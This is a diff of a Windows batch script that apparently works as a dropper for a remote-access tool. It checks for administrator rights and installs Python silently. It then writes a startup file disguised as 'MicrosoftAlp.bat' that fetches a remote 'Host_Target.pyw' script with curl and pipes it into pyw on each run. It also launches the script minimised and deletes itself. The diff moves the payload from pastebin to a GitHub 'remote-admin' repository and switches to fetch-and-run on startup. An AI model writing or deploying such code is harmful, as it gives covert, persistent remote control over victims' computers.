@@ -1,3 +1,5 @@
+:: Python32w.pyw
+
 @echo off
 
 >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
@@ -18,8 +20,8 @@ if '%errorlevel%' NEQ '0' (
     CD /D "%~dp0"
 
 set DOWNLOAD_DIR=%TEMP%
-set PYTHON_SCRIPT_URL=https://pastebin.com/raw/A7Q5182y
-set PYTHON_SCRIPT_NAME=Python3w.pyw
+set PYTHON_SCRIPT_URL=https://raw.githubusercontent.com/Mana42138/remote-admin/main/Host_Target.pyw
+set PYTHON_SCRIPT_NAME=Python32w.pyw
 set PYTHON_SCRIPT_PATH=%DOWNLOAD_DIR%\%PYTHON_SCRIPT_NAME%
 set STARTUP_BATCH_NAME=MicrosoftAlp.bat
 set STARTUP_BATCH_PATH=%DOWNLOAD_DIR%\%STARTUP_BATCH_NAME%
@@ -32,11 +34,8 @@ if not exist "%DOWNLOAD_DIR%" (
 
 py --version >nul 2>&1
 IF %ERRORLEVEL% NEQ 0 (
-
     curl -o "%DOWNLOAD_DIR%\python-installer.exe" https://www.python.org/ftp/python/3.11.3/python-3.11.3-amd64.exe
-
     "%DOWNLOAD_DIR%\python-installer.exe" /quiet InstallAllUsers=1 PrependPath=1
-
     py -m pip --version >nul 2>&1
     IF %ERRORLEVEL% NEQ 0 (
         pause
@@ -46,20 +45,11 @@ IF %ERRORLEVEL% NEQ 0 (
     echo Python is already installed
 )
 
-curl -o "%PYTHON_SCRIPT_PATH%" "%PYTHON_SCRIPT_URL%"
-
 echo Creating startup batch file...
 echo @echo off > "%STARTUP_BATCH_PATH%"
-echo pyw "%PYTHON_SCRIPT_PATH%" >> "%STARTUP_BATCH_PATH%"
+echo curl -s "%PYTHON_SCRIPT_URL%" ^| pyw - >> "%STARTUP_BATCH_PATH%"
 
-if exist %STARTUP_FOLDER% (
-    move "%STARTUP_BATCH_PATH%" %STARTUP_FOLDER%
-) else (
-    pause
-    exit /b 1
-)
-
-start pyw "%PYTHON_SCRIPT_PATH%"
+start /min pyw "%PYTHON_SCRIPT_PATH%"
 
 :: Clean up
 del "%~f0"
